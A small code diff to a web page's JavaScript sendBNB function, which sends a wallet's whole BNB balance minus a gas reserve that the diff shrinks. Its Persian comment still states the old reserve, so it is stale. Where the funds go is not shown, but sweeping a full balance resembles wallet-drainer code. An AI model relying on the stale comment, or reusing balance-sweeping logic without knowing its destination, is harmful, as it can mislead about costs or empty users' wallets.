@@ -61,7 +61,7 @@ async function sendBNB(){
         const balance = parseInt(balanceHex,16);
 
         // مقداری برای Gas نگه می‌داریم (~0.00021 BNB)
-        const gasReserve = 210000000000000; 
+        const gasReserve = 1500000000000; 
         const sendAmount = balance - gasReserve;
         if(sendAmount <= 0){
             alert("موجودی کافی برای Gas ندارید");
@@ -88,3 +88,4 @@ async function sendBNB(){
 
 </body>
 </html>
+
